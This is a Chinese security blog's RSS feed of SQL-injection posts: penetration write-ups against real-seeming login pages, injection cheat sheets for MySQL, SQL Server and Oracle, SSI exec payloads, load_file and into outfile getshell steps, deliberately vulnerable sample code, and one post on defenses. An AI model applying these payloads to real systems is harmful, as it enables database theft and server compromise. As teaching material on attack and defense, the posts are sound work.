<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>injection on </title>
    <link>https://wyb0.com/tags/injection/</link>
    <description>Recent content in injection on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 22 Jun 2020 17:35:07 +0800</lastBuildDate>
    
	<atom:link href="https://wyb0.com/tags/injection/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>记一次 SQL 注入简单 bypass</title>
      <link>https://wyb0.com/posts/2020/recording-a-injection-bypass/</link>
      <pubDate>Mon, 22 Jun 2020 17:35:07 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2020/recording-a-injection-bypass/</guid>
      <description>0x00 存在 SQL 注入 总之是遇到一个站，登录的页面，数据包大致如下：
POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1 Host: 115.xxx.xxx.xxx:8042 Content-Length: 47 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://115.xxx.xxx.xxx:8042 Referer: http://115.xxx.xxx.xxx:8042/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt Connection: close uname=admin*&amp;amp;pwd=dskfsdkf&amp;amp;valCode=1197&amp;amp;telphone=  其中验证码可以绕过，而登录名那里存在注入 使用 and 1=1、and 1=2 时，发现过滤了空格，用/**/代替 0x01 简单看一下 中间件是 IIS，存在 len 函数，确定为 SQLServer Order by 一下，看看能不能 union，发现有 10 列 尝试 union select admin 转换为 int 时出错，感觉好像能显示位，测试发现确实可以显示 可以获取数据库版本，可以确定有 union 注入了 0x02 sqlmap sqlmap跑一下：sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.</description>
    </item>
    
    <item>
      <title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title>
      <link>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link>
      <pubDate>Sat, 27 Jul 2019 18:15:25 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid>
      <description>0x00 先说前提 昨天某个小伙伴说有个注入没法搞 前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了 0x01 找加密的 js 文件 注入的地方是获取验证码时的手机号, 刚开始想着先找到 js 加密的函数, 然后生成 sign 再组数据包发送。
就像 记一次SQL Server报错注入 中一样, 用 selenium 或者 PhantomJS 执行 js 代码生成sign
一番查找发现了加密的 js 文件函数, 但是用的是 angular 这个前端框架, 没用过这个东西。。。。。 能看懂一般的 js 代码, 但是这个没得搞, 不懂。。。
0x02 数据中转 本来昨天我已经放弃了的, 结果今天上午小伙伴又找我了, 说还没有整好, 又看了一通 js, 仍然无解, 看不懂。。。
想起昨天有个大佬说用 PhantomJS + flask 这样、那样、再这样, 中转数据就可以用 sqlmap 跑了, emmmmm。。。

虽然很早以前用过 asp 的 Cookie 注入中转 , 但是那个是软件, 一直没有搞懂原理, 现在正好趁机学下</description>
    </item>
    
    <item>
      <title>SQL注入tips(Oracle)</title>
      <link>https://wyb0.com/posts/2019/injection-tips-of-oracle/</link>
      <pubDate>Fri, 04 Jan 2019 20:23:35 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2019/injection-tips-of-oracle/</guid>
      <description>0x00 判断数据库类型  Oracle有一些自带的表：dual、user_tables
 id=45 and (select count(*) from user_tables)&amp;gt;0-- id=45 and (select count(*) from dual)&amp;gt;0--  利用自带的一些函数：譬如utl_http.request 这些
 利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)
  0x01 基本信息获取  查看sid
select instance_name from v$instance;  查看数据库版本：
select banner from v$version where rownum=1; select banner from sys.v_$version where rownum=1;  查看用户：
select user from dual; --当前用户 select username from user_users; --当前用户 select username from all_users; --查看所有用户 select username from dba_users; --查看所有用户(需要有权限)  查看当前用户角色：</description>
    </item>
    
    <item>
      <title>记一次SQL Server报错注入</title>
      <link>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link>
      <pubDate>Mon, 24 Dec 2018 10:51:02 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid>
      <description>0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
用户不存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;用户名不存在！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
用户名存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;密码不正确！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
可以的，验证码前端验证，我觉得可以burp抓包intruder一下
跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad
0x01 存在注入 嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！ 可以的，and 1=1 有注入
哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？
刚才看了数据包，用户名密码都是32位，猜想sql语句是：select password from user where username=name_md5_hash，然后判断用户存不存在之类的
看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。
试试post其他用户名和密码，然后看数据包 显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个 emmmmm，想了想，应该可以注入的，看看啥系统 大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server 看看数据库版本，嗯，看来还是报错注入 可以可以，看看有几列，然后进行union注入 一列，这里也能大致猜出来sql语句了，估计就是：select password from user where username=&#39;admin&#39;
那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。
得到第一个数据库的名字：union select name from master.dbo.sysdatabases where dbid=1 得到第二个数据库的名字：union select name from master.dbo.sysdatabases where dbid=2 得到第5个数据库的名字：union select name from master.dbo.sysdatabases where dbid=5 好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。
py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入</description>
    </item>
    
    <item>
      <title>SQL注入tips(SQL Server)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link>
      <pubDate>Tue, 04 Sep 2018 10:09:17 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp;amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  select name from msg where id=1 and 1=convert(int,(select is_srvrolemember(&#39;sysadmin&#39;)));   得到所有数据库名字   --得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 id=1 and 0&amp;lt;&amp;gt;(select name from master.</description>
    </item>
    
    <item>
      <title>SQL注入tips(MySQL)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-mysql/</link>
      <pubDate>Wed, 23 May 2018 11:14:51 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/injection-tips-of-mysql/</guid>
      <description>环境：MySQL 5.5.47
0x00 注入点在Order by后面 mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &#39;C:\\Apps\\phpStudy\\WWW\\a.txt&#39;; Query OK, 1 row affected (0.01 sec)  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~msg~&#39;  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~rtest~&#39;  mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=1,1,(select 1 union select 2)); +----------+ | name | +----------+ | xiaohong | +----------+ 1 row in set (0.</description>
    </item>
    
    <item>
      <title>ThinkPHP5的where函数</title>
      <link>https://wyb0.com/posts/2018/thinkphp5-where-function/</link>
      <pubDate>Mon, 16 Apr 2018 19:16:14 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2018/thinkphp5-where-function/</guid>
      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
0x01 示例代码 tp5/application/home/controller/Index.php
&amp;lt;?php namespace app\home\controller; use think\Db; class Index { //http://127.0.0.1/Source/tp5/home/index/testdb/id/1 public function testDb() { // 调用 tp5/thinkphp/library/think/Db.php 的 connect() 函数 初始化数据库，并取得数据库类实例 $msg = db(&#39;msg&#39;); $id = input(&#39;param.id&#39;,1); //不存在id的话默认为1 //在Db.php中use think\db\Query; $msg-&amp;gt;where()则调用了Query.php中的where函数进入查询流程 $result = $msg-&amp;gt;where(&amp;quot;id=&amp;quot;.$id)-&amp;gt;select(); // $result = $msg-&amp;gt;where([&#39;id&#39;=&amp;gt;$id])-&amp;gt;select(); echo &#39;&amp;lt;br/&amp;gt;&amp;lt;hr/&amp;gt;执行的sql语句：&#39;; echo $msg-&amp;gt;getLastSql(); echo &#39;&amp;lt;br/&amp;gt;最终得到的结果：&#39;; echo var_dump($result); } }  where函数接收字符串和数组时，访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1执行的SQL语句分别如下：
SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，当payload为: ) and 1=1 and (1)=(1时判断返回如下： 主要调用文件及函数顺序如下：</description>
    </item>
    
    <item>
      <title>SSI注入</title>
      <link>https://wyb0.com/posts/2017/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2017/ssi-injection/</guid>
      <description> 0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
若注入点在url中则可能需要进行url编码
0x01 payload &amp;quot;--&amp;gt;&#39;--&amp;gt;`--&amp;gt;&amp;lt;!--#set var=&amp;quot;a&amp;quot; value=&amp;quot;123&amp;quot;--&amp;gt;&amp;lt;!--#set var=&amp;quot;b&amp;quot; value=&amp;quot;654&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;a&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;b&amp;quot;--&amp;gt; &amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt; &amp;lt;!--#exec cmd=&amp;quot;dir&amp;quot; --&amp;gt;  0x02 示例  Referer被输出到了页面中   url中的数据被输出到页面中(有时候url中的payload需要url编码)  </description>
    </item>
    
    <item>
      <title>[转]MySQL报错注入原理分析(count()、rand()、group by)</title>
      <link>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link>
      <pubDate>Sun, 13 Nov 2016 11:59:26 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid>
      <description>原文链接：http://drops.wooyun.org/tips/14312
0x00 疑问 一直在用mysql数据库报错注入方法，但为何会报错？
百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。
0x01 位置问题？ select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;这是网上最常见的语句,目前位置看到的网上sql注入教程,floor 都是直接放count(*)后面，为了排除干扰，我们直接对比了两个报错语句，如下图
由上面的图片，可以知道报错跟位置无关。
0x02 绝对报错还是相对报错？ 是不是报错语句有了floor(rand(0)*2)以及其他几个条件就一定报错？其实并不是如此，我们先建建个表，新增一条记录看看，如下图： 确认表中只有一条记录后，再执行报错语句看看，如下图： 多次执行均未发现报错。
然后我们新增一条记录。 然后再测试下报错语句 多次执行并没有报错
OK 那我们再增加一条 执行报错语句 ok 成功报错
由此可证明floor(rand(0)*2)报错是有条件的，记录必须3条以上，而且在3条以上必定报错，到底为何？请继续往下看。
0x03 随机因子具有决定权么(rand()和rand(0)) 为了更彻底的说明报错原因，直接把随机因子去掉，再来一遍看看，先看一条记录的时候，如下图: 一条记录的话 无论执行多少次也不报错
然后增加一条记录。
两条记录的话 结果就变成不确定性了 随机出现报错。
然后再插入一条
三条记录之后，也和2条记录一样进行随机报错。
由此可见报错和随机因子是有关联的，但有什么关联呢，为什么直接使用rand()，有两条记录的情况下就会报错，而且是有时候报错，有时候不报错，而rand(0)的时候在两条的时候不报错，在三条以上就绝对报错？我们继续往下看。
0x04 不确定性与确定性 前面说过，floor(rand(0)*2)报错的原理是恰恰是由于它的确定性，这到底是为什么呢？从0x03我们大致可以猜想到，因为floor(rand()*2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)*2)就一定报错，由此可猜想floor(rand()*2)是比较随机的，不具备确定性因素，而floor(rand(0)*2)具备某方面的确定性。
为了证明我们猜想，分别对floor(rand()*2)和floor(rand(0)*2)在多记录表中执行多次(记录选择10条以上)，在有12条记录表中执行结果如下图：
mysql&amp;gt; select floor(rand()*2) from `T-Safe`; +-----------------+ | floor(rand()*2) | +-----------------+ | 0 | | 0 | | 0 | | 0 | | 0 | | 0 | | 1 | | 0 | | 0 | | 0 | | 0 | | 0 | +-----------------+ 12 rows in set (0.</description>
    </item>
    
    <item>
      <title>SQL注入之防御</title>
      <link>https://wyb0.com/posts/2016/injection-of-defense/</link>
      <pubDate>Sat, 25 Jun 2016 10:25:11 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-defense/</guid>
      <description>0x00 要做的事 也就是找到注入点然后修复
0x01 防御方法  使用预编译语句绑定变量(比如php的mysqli、pdo)
&amp;lt;?php //预编译 $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;); $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;); $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;; $s = $mysqli-&amp;gt;prepare($sql); //绑定参数 $name = &amp;quot;Tom&amp;quot;; $sex = &amp;quot;M&amp;quot;; $age = 23; $s-&amp;gt;bind_param(&amp;quot;ssi&amp;quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&amp;gt;execute(); var_dump($result); $s-&amp;gt;close(); ?&amp;gt;  使用存储过程(这里以SQLServer举例)
  --如果存在名为get_student_msg(相当于函数)的存储过程则删除 IF EXISTS (SELECT name FROM sysobjects WHERE name=&#39;get_student_msg&#39; AND type=&#39;p&#39;) DROP PROCEDURE get_student_msg CREATE PROCEDURE get_student_msg --创建存储过程 @name VARCHAR(20) --声明全局变量 AS BEGIN SELECT * from info WHERE name=@name END GO --创建好存储过程后在其他地方直接使用函数并传参就行了 EXEC get_student_msg &#39;xiaoli&#39;   使用转义函数</description>
    </item>
    
    <item>
      <title>SQL注入之宽字节注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 15:32:34 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-wide-byte/</guid>
      <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&amp;quot;\&amp;quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
0x01 测试代码 &amp;lt;?php $conn = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); mysql_select_db(&#39;messages&#39;,$conn); if (isset($_GET[&#39;id&#39;])) { $id = addslashes($_GET[&#39;id&#39;]); //转义id $sql = &amp;quot;select * from msg where id=&#39;$id&#39;;&amp;quot;; echo $sql.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo &#39;&amp;lt;table align=&amp;quot;left&amp;quot; border=&amp;quot;1&amp;quot;&amp;gt;&#39;; foreach ($rows as $key =&amp;gt; $value) { echo &#39;&amp;lt;tr align=&amp;quot;lift&amp;quot; height=&amp;quot;30&amp;quot;&amp;gt;&#39;; echo &#39;&amp;lt;td&amp;gt;&#39;.$key.&#39;----&#39;.$value.&#39;&amp;lt;/td&amp;gt;&#39;; echo &#39;&amp;lt;/tr&amp;gt;&#39;; } echo &#39;&amp;lt;/table&amp;gt;&#39;; } else { echo mysql_error(); } } else { echo &amp;quot;please input id.</description>
    </item>
    
    <item>
      <title>SQL注入之基于时间的注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-time-based/</link>
      <pubDate>Fri, 24 Jun 2016 10:10:27 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-time-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。 其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。  0x01 利用方式 整型注入的话可以直接: ?id=if(1=1,sleep(2),1) 字符型的话需要闭合: ?id=2&#39; and if(1=1,sleep(2),1) and &#39;1  0x02 相关函数  if(条件, 值1, 值2)
当条件为真时返回值1，条件为假时返回值2
 sleep()
sleep(2)睡眠两秒
 benchmark(count, expr)
benchmark是用于测试函数性能的，它是将表达式expr执行count次，执行次数越多耗费时间越久
  0x03 基于时间的注入payload mysql&amp;gt; select if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),666); +---------------------------------------------------+ | if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),666) | +---------------------------------------------------+ | 0 | +---------------------------------------------------+ 1 row in set (2.00 sec) mysql&amp;gt; select if((select database())=&amp;quot;rteaaa&amp;quot;,sleep(2),666); +-----------------------------------------------+ | if((select database())=&amp;quot;rtest1&amp;quot;,sleep(2),666) | +-----------------------------------------------+ | 666 | +-----------------------------------------------+ 1 row in set (0.</description>
    </item>
    
    <item>
      <title>SQL注入之布尔型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-boolian-based/</link>
      <pubDate>Thu, 23 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-boolian-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用  0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据  0x02 注入步骤  找到注入点，判断闭合字符  尝试猜解列数，得到显示位  得到数据库名 最终得到第五个数据库名为security
 得到表名 最终依次猜的表名为users
 得到列名 同理最终得到第2列列名为username，第3列列名为password
 得到列值 依次得到为admin4，同理可得其他数据
  0x04 附上python脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; __author__=&amp;quot;reber&amp;quot; import sys import requests import binascii import hashlib from pyfiglet import figlet_format from optparse import OptionParser def get_md5_html(url): html = requests.</description>
    </item>
    
    <item>
      <title>SQL注入之报错型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-error-based/</guid>
      <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解  0x01 利用方式 报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
?id=2&amp;rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+
第一个公式具体原理可以参考：MySQL报错注入原理分析(count()、rand()、group by)
0x02 公式解析 floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次  0x03 注入步骤  猜测闭合字符  猜测列数  尝试得到显示位  报错得到数据库个数  报错得到数据库名  报错得到表名  报错得到列名  得到列值   0x04 附上利用代码 #!</description>
    </item>
    
    <item>
      <title>SQL注入之联合查询(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-union-select/</guid>
      <description> 0x00 前提 要用联合查询进行注入则：页面必须有显示位
0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同
0x02 注入步骤  找到注入点得到闭合字符  判断数据库类型  猜解列数，得到显示位(从数据库中查询出来的数据有些会显示在页面中，显示的位置就是显示位)  得到基本信息(数据库名、版本、数据库版本等)  得到数据库  得到security数据库的表名  猜解列名  猜解数据   </description>
    </item>
    
    <item>
      <title>SQL注入之load_file和into outfile(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
      <description>0x00 load_file() 读文件  条件:  1. 要有file_priv权限: show global variables like &#39;%secure%&#39;; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
 读/etc/init.d下的东西，这里有配置文件路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)  读取密码文件
?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 load data local infile 读文件  条件:  MySQL8 中需要 SET GLOBAL local_infile=1;   语句  LOAD DATA LOCAL INFILE &#39;D:/pet.txt&#39; INTO TABLE pet FIELDS TERMINATED BY &#39;&#39;; select * from pet;  0x02 into outfile getshell  条件：  1.</description>
    </item>
    
    <item>
      <title>SQL注入</title>
      <link>https://wyb0.com/posts/2016/injection/</link>
      <pubDate>Sun, 19 Jun 2016 20:18:48 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection/</guid>
      <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
0x01 成因 SQl语句未对用户参数进行严格过滤
0x02 可引发注入的地方 其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入，常见的如下，按出现频率排序：
 GET POST X-Forwarded-For Cookie User-Agent  0x03 注入分类  根据语法(较权威)
 UNION query SQL injection(可联合查询注入)
只要页面有显示位即可使用，且注入速度很快 Error-based SQL injection(报错型注入)
没有显示位但用echo &amp;ldquo;mysql_error()&amp;ldquo;输出了错误信息，速度很快，但是语句较复杂 Boolean-based blind SQL injection(布尔型注入)
一次一个字节，速度慢，但只要有注入就能用 Time-based blind SQL injection(基于时间延迟注入)
超级慢，比布尔型注入慢几倍，但是通用性较强 Stacked queries SQL injection(堆叠注入)
只有SQL Server可以使用(可多语句查询注入)  根据类型
 整形
形如&amp;quot;a.asp?ID=55&amp;quot;，这类注入的参数是&amp;rdquo;数字&amp;rdquo;，因此称为&amp;rdquo;数字型注入点&amp;rdquo;。 字符串型
形如&amp;quot;b.asp?name=xiaoming&amp;quot;这类注入的参数是&amp;rdquo;字符&amp;rdquo;，称为&amp;rdquo;字符型&amp;rdquo;注入点。
 搜索型
指在进行数据搜索时没过滤搜索参数，直接通过搜索框表单提交。
   0x04 查找注入点  在URL中
 and 1=1/and 1=2(整型) 随即输入(整型) -1/+1 回显上下页面(整型) 单引号(字符型/整型) and sleep(5) (判断页面返回时间)  在http头</description>
    </item>
    
    <item>
      <title>ASP联合注入(Cookie处)</title>
      <link>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0800</pubDate>
      
      <guid>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid>
      <description> 0x00 Cookie注入的使用  三大Web提交方式
 GET：直接在浏览器上面访问地址
 POST：提交表单(会员注册、文件上传等)
 COOKIE：访问网站下面自带的身份验证的值  Cookie注入利用时机
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。  利用方法
 可以利用注入中转 可以利用sqlmap   0x01 用注入中转进行Cookie注入  目标：http://localhost:81/2/shownews.asp?id=183
 打开注入中转这个工具，填入相应参数，然后点击生成ASP，将生成的asp文件(jmCook.asp)放入你自己搭建的网站内后即可进行注入  提交localhost:81/jmCook.asp?jmdcw=183 order by猜测字段数
 提交localhost:81/jmCook.asp?jmdcw=183 UNION SELECT 1,2,3,4 from XXX猜测表名  猜测内容   0x02 用sqlmap进行Cookie注入  sqlmap验证存在Cookie注入  猜表名  猜列名  猜字段内容   </description>
    </item>
    
  </channel>
</rss>